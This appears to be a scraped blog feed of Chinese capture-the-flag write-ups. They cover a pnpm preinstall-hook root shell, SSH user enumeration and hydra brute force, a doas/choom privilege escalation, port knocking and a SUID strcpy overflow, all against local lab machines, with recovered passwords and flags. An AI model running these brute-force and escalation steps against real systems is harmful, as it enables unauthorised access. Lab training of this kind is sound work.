      outdated             Check for outdated packages

Run your scripts:
      exec                 Executes a shell command in scope of a project
      run                  Runs a defined package script
      start                Runs an arbitrary command specified in the package's 'start' property of its 'scripts' object
   t, test                 Runs a package's 'test' script, if one was provided

Other:
      cat-file             Prints the contents of a file based on the hash value stored in the index file
      cat-index            Prints the index file of a specific package from the store
      find-hash            Experimental! Lists the packages that include the file with the specified hash.
      pack                 Create a tarball from a package
      publish              Publishes a package to the registry
      root                 Prints the effective modules directory

Manage your store:
      store add            Adds new packages to the pnpm store directly. Does not modify any projects or files outside the store
      store path           Prints the path to the active store directory
      store prune          Removes unreferenced (extraneous, orphan) packages from the store
      store status         Checks for modified packages in the store

Options:
  -r, --recursive          Run the command for each project in the workspace.
```



看着有点像npm啊，这玩意和npm差不多吧？试试

![image-20250608122239857](https://7r1umphk.github.io/image/20250608122240292.webp)

```
lingdong:~$ TF=$(mktemp -d)
lingdong:~$ echo '{'scripts': {'preinstall': '/bin/sh'}}' &gt; $TF/package.json
lingdong:~$ sudo pnpm -C $TF --unsafe-perm i
Already up to date

&gt; @ preinstall /tmp/tmp.ggFJFL
&gt; /bin/sh

/tmp/tmp.ggFJFL # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

可以，拿一下flag

```
/tmp/tmp.ggFJFL # cat /root/root.txt 
flag{root-b89ed76b27e91ad5d773ddadae256072}
/tmp/tmp.ggFJFL # cat /home/welcome/user.txt 
flag{user-afc8b494c5ba167971f10274f5a81534}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_bughash.html</guid><pubDate>Fri, 27 Jun 2025 09:29:30 +0000</pubDate></item><item><title>vulnyx_Denied</title><link>https://7r1UMPHK.github.io/post/vulnyx_Denied.html</link><description># 1. 信息收集 - 目标锁定！

![image-20250519113211432](https://7r1umphk.github.io/image/20250519113211569.webp)

这靶机纯复现，因为我都知道它口在哪了。不过，流程还是要走一遍的嘛！

### 1. 信息收集 - 目标锁定！

老一套，先用 `arp-scan` 看看内网里谁是目标。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l        
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.217 08:00:27:63:80:7c       PCS Systemtechnik GmbH # &lt;--- 就是你了！
192.168.205.254 00:50:56:ed:bd:56       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 4 responded
```
IP地址 `192.168.205.217` 到手，接着 `nmap` 大法伺候，看看开了些啥端口，跑了啥服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p22,80,8080 -sV 192.168.205.217
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 23:33 EDT
Nmap scan report for denied.nyx (192.168.205.217)
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
8080/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:63:80:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds
```
开了 22 (SSH), 80 (HTTP), 还有个 8080 (也是HTTP)。都是 Apache 2.4.62，SSH 版本是 OpenSSH 9.2p1。

### 2. Web 服务探测 - Apache 欢迎您！

先 `curl` 一下 80 和 8080 端口看看。两个端口都是 Apache 的默认欢迎页面，一模一样。看来没啥特别的东西。
接着上目录爆破，用 `gobuster` 扫了一圈，换了好几个字典，包括 `directory-list-2.3-medium.txt`, `directory-list-2.3-big.txt`，甚至我自己改的倒序 `hbig.txt`，还试了各种常见的扩展名。

```bash
gobuster dir -u http://192.168.205.217:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip 
gobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip 
gobuster dir -u http://192.168.205.217:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -x php,txt,html,zip 
gobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -x php,txt,html,zip # Note: Log had 80, but context implies 8080
gobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/hbig.txt -x php,txt,html,zip,bak,old,conf,cgi,sh,log,.htaccess
```
结果是...啥也没扫出来。Web 这边看来是条死胡同。还试了下DNS子域名爆破，也没啥发现。

```bash
gobuster dns -d http://disguise.hmv/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### 3. SSH 突破 - 用户名枚举与爆破

Web 没戏，那就只能从 SSH 下手了。先试试 `root` 用户。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh root@192.168.205.217
root@192.168.205.217: Permission denied (publickey).
```
提示 `Permission denied (publickey)`，看来 `root` 用户是禁止密码登录，强制用密钥。

这时候我想起了昨天看到的 ll04567 大佬的思路...
![image-20250519113954961](https://7r1umphk.github.io/image/20250519113955108.webp)
害，昨天为什么要看到，没看到就可以自己摸索一下了。既然是复现，那就按这个思路走。
大佬的思路是存在一个可以密码登录的普通用户。用 `seclists` 里的用户名字典尝试枚举一下：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ for i in $(cat /usr/share/seclists/Usernames/Names/names.txt);do ssh $i@192.168.205.217 ;done
# ... (大量尝试) ...
akira@192.168.205.217's password: 
```
(这里手动 `Ctrl+C` 停止枚举)
枚举到用户 `akira` 的时候，SSH 客户端提示输入密码，而不是像其他用户那样直接 `Permission denied (publickey)`。这说明 `akira` 用户存在，并且允许密码登录！

找到用户名 `akira`，接下来就是祭出 `hydra` 大法爆破密码了。用了一个常用的密码字典 `5000q.txt`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ hydra -l akira -P 5000q.txt ssh://192.168.205.217 -V -I          
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-18 23:41:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5000 login tries (l:1/p:5000), ~313 tries per task
[DATA] attacking ssh://192.168.205.217:22/
[ATTEMPT] target 192.168.205.217 - login 'akira' - pass '123456' - 1 of 5000 [child 0] (0/0)
# ... (大量尝试输出) ...
[ATTEMPT] target 192.168.205.217 - login 'akira' - pass 'shakira' - 568 of 5003 [child 7] (0/3)
[22][ssh] host: 192.168.205.217   login: akira   password: shakira
^C                                                                                                                                                                                   
```
Bingo! `hydra` 成功爆出密码 `akira:shakira`。

赶紧登录！
```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh akira@192.168.205.217 
akira@192.168.205.217's password: shakira
akira@denied:~$ id
uid=1000(akira) gid=1000(akira) grupos=1000(akira)
```
成功以 `akira` 用户登录系统！

### 4. 权限提升 - akira -&gt; root

拿到 `akira` 的 shell，先看看家目录有啥，顺便把 `user.txt` 读了。

```bash
akira@denied:~$ ls -la
total 28
drwx------ 3 akira akira 4096 may 18 13:03 .
drwxr-xr-x 3 root  root  4096 may 18 11:25 ..
lrwxrwxrwx 1 root  root     9 nov 15  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 akira akira  220 nov 15  2023 .bash_logout
-rw-r--r-- 1 akira akira 3526 nov 15  2023 .bashrc
drwxr-xr-x 3 akira akira 4096 may 18 11:41 .local
-rw-r--r-- 1 akira akira  807 nov 15  2023 .profile
-r-------- 1 akira akira   33 may 18 11:41 user.txt
akira@denied:~$ cat user.txt 
6acfb2803973dacc95152a873ba79255
```
User flag到手！接下来看看能不能提权到 `root`。
先试试 `sudo -l`：
```bash
akira@denied:~$ sudo -l
-bash: sudo: orden no encontrada
```
“orden no encontrada”，西班牙语的 “command not found”。看来系统里没有 `sudo`，或者 `akira` 用户的 `PATH` 没配好。

那就找找有没有 SUID 程序可以利用。
```bash
akira@denied:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/mount
/usr/bin/chsh
/usr/bin/doas  # &lt;--- 这个看起来不一般！
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```
发现了一个 `/usr/bin/doas`，这玩意儿是 `sudo` 的一个轻量级替代品。有戏！
看看 `doas` 能不能直接用：
```bash
akira@denied:/opt$ /usr/bin/doas -h
/usr/bin/doas: invalid option -- 'h'
usage: doas [-Lns] [-C config] [-u user] command [args]
akira@denied:/opt$ /usr/bin/doas -u root bash
doas: Operation not permitted
```
直接用 `doas -u root bash` 提示 “Operation not permitted”。看来 `akira` 用户不能随便用 `doas` 执行所有命令。
那它到底能用 `doas` 执行啥呢？得想办法枚举一下 `/etc/doas.conf`或者暴力测试 `/usr/bin` 下的命令。结果发现`/etc/doas.conf`不给看，那就只可以暴力测试
根据日志，是通过遍历测试发现 `/usr/bin/choom` 可以用 `doas` 执行：

```bash
akira@denied:/opt$ for i in $(ls /usr/bin); do doas -u root /usr/bin/$i 2&gt;&amp;1 | grep -v 'doas: Operation not permitted';done
choom: no se ha especificado ni PID ni ORDEN
Escriba 'choom --help' para obtener más información.
akira@denied:/opt$ /usr/bin/doas -u root /usr/bin/choom --help

Modo de empleo:
 choom [opciones] -p pid
 choom [opciones] -n número -p pid
 choom [opciones] -n número [--] orden [args...]]  # &lt;--- 关键在这！

Muestra y ajusta la puntuación de matador OOM.

Opciones:
 -n, --adjust &lt;num&gt;     especifica el valor de ajuste de puntuación
 -p, --pid &lt;num&gt;        ID de proceso

 -h, --help             muestra esta ayuda
 -V, --version          muestra la versión
```
`choom` 的帮助信息里写着可以用 `-n &lt;número&gt; [--] orden [args...]` 的方式来执行一个命令！既然 `doas` 允许 `akira` 以 `root` 权限执行 `choom`，那我们就可以通过 `choom` 来间接以 `root` 权限执行任意命令了！

利用这个特性，让 `choom` 执行 `/bin/bash -p` (`-p` 参数是为了让 bash 保持有效用户ID为 root)。
```bash
akira@denied:/opt$ /usr/bin/doas -u root /usr/bin/choom -n -1000-p 0 bash
root@denied:/opt# id
uid=0(root) gid=0(root) grupos=0(root)
```
Boom! `uid=0(root)`，成功拿到 root 权限！

### 5. 收获 Root Flag

拿到 root shell，最后一步当然是读取 `/root/root.txt`。
```bash
root@denied:/opt# cat /root/root.txt 
ea2118e462426513a247964eb8320c27
```
Root flag到手！Denied 靶机，卒！
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/vulnyx_Denied.html</guid><pubDate>Fri, 27 Jun 2025 09:29:22 +0000</pubDate></item><item><title>VulnHub Death Star- 1 渗透测试报告</title><link>https://7r1UMPHK.github.io/post/VulnHub%20Death%20Star-%201%20-shen-tou-ce-shi-bao-gao.html</link><description>靶机地址: [https://www.vulnhub.com/entry/death-star-1,477/](https://www.vulnhub.com/entry/death-star-1,477/)

![image-20250515144334733](https://7r1umphk.github.io/image/20250515144342235.webp)

### 1. 主机发现与端口扫描

首先，使用 `arp-scan` 发现靶机 IP 地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ sudo arp-scan -l     
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.210 08:00:27:b2:99:5a       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ee:d6:af       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.977 seconds (129.49 hosts/sec). 4 responded
```

靶机 IP 为 `192.168.205.210`。

尝试进行全端口快速扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ nmap -p- --min-rate 10000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:32 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00051s latency).
All 65535 scanned ports on 192.168.205.210 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
```

没有扫描到开放端口，所有端口状态为 `ignored` 或 `filtered`。
确认主机是否连通：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ ping 192.168.205.210
PING 192.168.205.210 (192.168.205.210) 56(84) bytes of data.
64 bytes from 192.168.205.210: icmp_seq=1 ttl=64 time=0.475 ms
...
--- 192.168.205.210 ping statistics ---
11 packets transmitted, 11 received, 0% packet loss, time 10231ms
rtt min/avg/max/mdev = 0.285/0.325/0.475/0.050 ms
```

主机是连通的。这表明可能有防火墙过滤了 TCP 端口扫描。

尝试使用 `-Pn` (跳过主机发现) 和其他扫描技术：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ sudo nmap -Pn -p- --min-rate 1000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:44 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00038s latency).
All 65535 scanned ports on 192.168.205.210 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 131.46 seconds
```

尝试 ACK 扫描 (`-sA`) 来探测防火墙规则集：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ sudo nmap -Pn -sA -p- --min-rate 1000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:47 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00038s latency).
All 65535 scanned ports on 192.168.205.210 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 131.40 seconds
```

结果依旧。尝试 FIN, Xmas, Null 隐蔽扫描：

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sF -p- --min-rate 1000 192.168.205.210 &amp;&amp; \
sudo nmap -Pn -sX -p- --min-rate 1000 192.168.205.210 &amp;&amp; \
sudo nmap -Pn -sN -p- --min-rate 1000 192.168.205.210
# ... (三次扫描结果类似，均为 open|filtered 或 filtered)
```

TCP 端口扫描似乎都无法穿透防火墙。尝试 UDP 扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ nmap -sU --top-ports 100 192.168.205.210                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:40 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00035s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 103.11 seconds
```

UDP 端口 68 (DHCP客户端) 通常不是可利用的入口。

尝试分片扫描 (`-f`) 和源端口伪装 (`-g 53`)：

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sS -f -p- --min-rate 1000 192.168.205.210
# ... (结果 filtered)
                                                                      
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sS -g 53 -p- --min-rate 1000 192.168.205.210
# ... (结果 filtered)
```

所有 TCP 扫描尝试均失败，看来需要另辟蹊径。

### 2. 流量捕获与信息获取

既然主动扫描效果不佳，尝试捕获靶机发出的流量，看是否有线索。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i eth0 host 192.168.205.210 -nn                                    
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
03:12:01.447736 IP 192.168.205.210.44226 &gt; 255.255.255.255.160: UDP, length 472
03:12:01.447804 IP 192.168.205.210.44226 &gt; 255.255.255.255.160: UDP, length 472
03:12:01.448295 IP 192.168.205.210.53472 &gt; 255.255.255.255.357: UDP, length 97
03:12:01.448342 IP 192.168.205.210.53472 &gt; 255.255.255.255.357: UDP, length 97
03:12:20.192762 IP 192.168.205.210.68 &gt; 192.168.205.254.67: BOOTP/DHCP, Request from 08:00:27:b2:99:5a, length 300
03:12:20.192956 IP 192.168.205.254.67 &gt; 192.168.205.210.68: BOOTP/DHCP, Reply, length 300
^C
6 packets captured
6 packets received by filter
0 packets dropped by kernel
```

发现靶机向广播地址的 UDP 端口 160 和 357 发送数据。使用 `nc` 监听这两个端口：

监听 UDP 160 端口：

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -ulnp 160 -vv
listening on [any] 160 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 44380

Thanks to the successful Operation Skyhook, the Rebel Alliance
got some plans for the new weapon of the Galactic Empire. We
know that there is a small opening that we can explore through a
thermal exhaust that is directly connected to the Main Reactor of the
Death Star. The superlaser takes 1440 minutes to reload.
It is very important to observe 'this window' in order to recover the blueprint.
This is because, it is only possible to make an attempt every 60 seconds.
^C sent 0, rcvd 472

# 翻译
得益于“天钩行动”的成功，义军同盟
获得了一些银河帝国新武器的图纸。我们
知道有一个小开口，可以通过一个热排气口进行探索，这个排气口直接连接到死星的主反应堆。超级激光器需要1440分钟才能重新装填。
为了获取蓝图，观察“这个窗口”至关重要。
这是因为，每60秒只能尝试一次。
```

监听 UDP 357 端口：

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -ulnp 357 -vv
[sudo] password for kali: 
listening on [any] 357 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 45629


Code to access the Death Star Blueprint
within the time it takes to reload is:  DS-1@OBS     

^C sent 0, rcvd 97
                   
# 翻译
在重新加载所需的时间内访问死星蓝图的代码是：DS-1@OBS
```

从 UDP 160 端口的信息中提取到数字 `1440` 和 `60`。从 UDP 357 端口的信息中获取到访问代码 `DS-1@OBS`。
提示要观察一个 '窗口'，结合数字，猜测这可能是端口号。

尝试扫描这些数字对应的 UDP 端口：

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sU -p1440,24,60 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 03:39 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00041s latency).

PORT     STATE  SERVICE
24/udp   closed priv-mail
60/udp   closed unknown
1440/udp open   eicon-slp
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

UDP 1440 端口开放。

### 3. 获取图片与信息提取

向 UDP 1440 端口发送之前获取的代码 `DS-1@OBS`：

```bash
┌──(kali㉿kali)-[~]
└─$ echo 'DS-1@OBS' | sudo nc -u 192.168.205.210 1440 &gt; 1440.txt
```

查看接收到的内容，发现是 Base64 编码的数据，开头为 `/9j/4AAQSkZJRg`，这是 JPEG 文件的典型特征。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 1440.txt | base64 -d &gt; 1440.jpg
```

(注: 实际操作中应确保数据完整接收，若图片不完整可能导致后续步骤失败。可以使用 `nc -u -w1` 设置超时。)

打开图片 `1440.jpg`：
![image-20250515154643417](https://7r1umphk.github.io/image/20250515154722764.webp)
图片上显示解锁代码：**197719801983**。

尝试对图片进行隐写分析。`strings` 和 `binwalk` 未发现明显线索。使用 `steghide`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ steghide extract -sf 1440.jpg
Enter passphrase: DS-1@OBS
wrote extracted data to 'openTheExhaust.txt'.
                 
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat openTheExhaust.txt       
Each segment of the 'unlock code' can only contain 3 characters sent in sequence to unlock port 10110.
                   
# 翻译
“解锁码”每段只能包含3个字符，按顺序发送即可解锁10110端口。
```

使用之前获取的 `DS-1@OBS` 作为密码，成功提取出 `openTheExhaust.txt` 文件。内容提示解锁代码每段3个字符，用于解锁 10110 端口。

### 4. 端口敲门与 SSH 登录

根据提示，将解锁代码 `197719801983` 分割成 `197`, `719`, `801`, `983`，并进行端口敲门：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ knock 192.168.205.210 197 719 801 983
```

敲门后，扫描目标端口 10110：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p10110 -sT -sU 192.168.205.210 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:31 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00035s latency).

PORT      STATE  SERVICE
10110/tcp open   nmea-0183
10110/udp closed nmea-0183
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

TCP 10110 端口已开放。探测服务版本：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p10110 -sV 192.168.205.210    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:32 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00033s latency).

PORT      STATE SERVICE VERSION
10110/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

端口 10110 运行的是 OpenSSH 6.6.1p1。尝试 SSH 登录，此时我们没有任何凭据，先用 root 试试：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh root@192.168.205.210 -p 10110
The authenticity of host '[192.168.205.210]:10110 ([192.168.205.210]:10110)' can't be established.
ECDSA key fingerprint is SHA256:oXn/1IjNjNv4INght0MV2FrWXVvTB4QNM9Bx1aRRLos.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.205.210]:10110' (ECDSA) to the list of known hosts.

# ... ASCII Art ...
                                                                          
Devoloped by Galen Walton Erso
System's user: erso
Pass Hint: My wife's first name plus the year (BBY) she died.

Glory to the Empire - Project DS-1: Orbital Battle Station


root@192.168.205.210's password: 
```

SSH 登录提示：

*   用户名: `erso`
*   密码提示: '我妻子的名字加上她去世的年份 (BBY)。' (My wife's first name plus the year (BBY) she died.)

根据星球大战背景，Galen Erso 的妻子是 Lyra Erso。
![image-20250515163544826](https://7r1umphk.github.io/image/20250515163545042.webp)

她去世的年份是 13 BBY (Before Battle of Yavin)。
![image-20250515163625883](https://7r1umphk.github.io/image/20250515163626074.webp)

构造可能的密码列表：

```
Lyra13
lyra13
LyraErso13
lyraerso13
Lyraerso13
lyraErso13
Lyra13BBY
lyra13BBY
Lyra13bby
lyra13bby
Lyra-13
lyra-13
Lyra_13
lyra_13
Lyra
lyra
Erso
```

使用 Hydra 进行爆破：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ hydra -l erso -P pass ssh://192.168.205.210 -s 10110 -I -u -f -e nsr -t 64    
\Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-15 04:46:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 20 login tries (l:1/p:20), ~1 try per task
[DATA] attacking ssh://192.168.205.210:10110/
[10110][ssh] host: 192.168.205.210   login: erso   password: lyra13
[STATUS] attack finished for 192.168.205.210 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-15 04:46:22
```

成功爆破出密码为 `lyra13`。
登录 SSH：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh erso@192.168.205.210 -p 10110
# ... (Login banner) ...
erso@deathStar1:~$ id
uid=1000(erso) gid=1000(erso) groups=1000(erso)
```

成功登录用户 `erso`。

### 5. 提权

查看 `sudo` 权限和家目录下的文件：

```bash
erso@deathStar1:~$ sudo -l
sudo: unable to resolve host deathStar1
[sudo] password for erso: 
Sorry, user erso may not run sudo on deathStar1.
erso@deathStar1:~$ ls -al
total 28
drwxr-xr-x 3 erso erso 4096 May  3  2020 .
drwxr-xr-x 3 root root 4096 May  3  2020 ..
lrwxrwxrwx 1 root root    9 May  3  2020 .bash_history -&gt; /dev/null
-rw-r--r-- 1 erso erso  220 May  3  2020 .bash_logout
-rw-r--r-- 1 erso erso 3631 May  3  2020 .bashrc
drwx------ 2 erso erso 4096 May  3  2020 .cache
-rw-r--r-- 1 erso erso  690 May  3  2020 .profile
-rw------- 1 erso erso  369 May  3  2020 warning.txt
erso@deathStar1:~$ cat warning.txt 
Message from GALEN ERSO:
This is your chance. Destroy the plans of the Galactic Empire. I know that Lord Vader will not like this at all. But, this will be my chance for redemption. I hope you have enough knowledge to help destroy this new weapon.
Explore the system and get 'root access' to read the secret message located at '/root/message.txt'. 
Hack or fail!!
```

提示 root flag 在 `/root/message.txt`。

查找 SUID 文件：

```bash
erso@deathStar1:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mtr
/usr/bin/pkexec
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/su
/bin/ping6
/bin/fusermount
/bin/dartVader  &lt;-- 可疑
/bin/umount
/bin/mount
/bin/ping
```

`/bin/dartVader` 是一个可疑的 SUID 文件，与靶机主题相关。

分析 `/bin/dartVader`：

```bash
erso@deathStar1:~$ ls -l /bin/dartVader
-rwsr-xr-x 1 root root 7338 Nov  7  2019 /bin/dartVader
erso@deathStar1:~$ file /bin/dartVader
/bin/dartVader: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=affd50502e973bd3d6d0637028395d87ba695ab9, not stripped
erso@deathStar1:~$ /bin/dartVader
dartVader: Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...
# 翻译: 达斯·维达：你拥有未来。别做拉默，去探索并真正学习……
```

这是一个 32 位 SUID 可执行文件。查看其字符串：

```bash
erso@deathStar1:~$ strings /bin/dartVader
# ... (部分输出) ...
strcpy
# ...
game3.c
# ...
```

发现 `strcpy` 函数和源文件名 `game3.c`，这强烈暗示存在缓冲区溢出漏洞。

测试缓冲区溢出：

```bash
erso@deathStar1:~$ /bin/dartVader aaaaaaaaa
erso@deathStar1:~$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
erso@deathStar1:~$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

输入大量 'a' 导致段错误，确认存在缓冲区溢出。

将 `/bin/dartVader` 文件传输到本地 Kali 进行分析：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ scp -P 10110 erso@192.168.205.210:/bin/dartVader .
# ... (传输成功) ...
```

使用 IDA Pro 反编译 `dartVader`：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[64]; // [esp+10h] [ebp-40h] BYREF

  if ( argc == 1 )
    errx(1, 'Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...\n');
  return (int)strcpy(dest, argv[1]);
}
```

`dest` 缓冲区大小为 64 字节。`strcpy` 将 `argv[1]` (命令行第一个参数) 复制到 `dest`，没有长度检查。

在 GDB 中确定 EIP 覆盖的精确偏移量：

